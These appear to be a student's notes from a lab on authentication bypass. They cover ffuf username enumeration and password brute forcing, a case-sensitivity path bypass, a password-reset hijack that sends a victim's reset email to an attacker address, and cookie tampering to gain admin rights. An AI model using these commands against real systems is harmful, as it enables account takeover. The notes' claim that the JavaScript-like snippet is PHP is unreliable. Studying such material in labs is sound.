Username Enumeration
1. Build a list of valid usernames (using ffuf)
2. Use brute force attack

Example:
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"

Where names.txt contains list of usernames we are going to check to see if they exist
FUZZ keyword signifies where the content of wordlist will be inserted

-w file's location
-X request method
-d data to send
-H additional headers
-u URL the request is going to
-mr text on the page we are searching for

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200

W1 usernames
W2 passwords
-fc any HTTP status other than 200



Logic Flaw 

if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}

PHP uses === to check for exact match including case. An unauthenticated user requesting /adMin will bypass authentication checks and will have pages displayed 


Send robert's reset email to hacker:
curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'

This works because the $_REQUEST variable contains data from query string and POST data. If the same key name is used for both, the logic favors the POST data field instead of the query string.




Cookie Tampering:

1. Get contents of cookie
curl http://MACHINE_IP/cookie-test

2. Change contents of cookie
curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test

Cookies are commonly hashed. Common hashes of cookies (and their original strings) are stored in databases such as: https://crackstation.net/ 

Cookies are also commonly encoded with md5, base32, or base64
